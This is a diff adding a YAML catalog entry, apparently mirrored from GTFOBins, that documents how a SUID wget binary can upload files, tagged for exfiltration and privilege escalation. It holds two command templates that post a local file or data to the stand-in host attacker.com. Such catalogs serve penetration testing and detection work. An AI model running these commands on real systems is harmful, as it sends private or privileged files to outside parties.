@@ -1,0 +1,25 @@
+id: gtfobins/wget/upload/suid
+type: binary
+platform: linux
+name: wget
+phases:
+- exfiltration
+- privilege-escalation
+capabilities:
+- file-upload
+privilege_required: suid
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: wget --post-file=/path/to/input-file http://attacker.com
+- template: wget --post-data=DATA http://attacker.com
+references:
+- https://gtfobins.github.io/gtfobins/wget/
+tags:
+- linux
+- unix
+- gtfobins
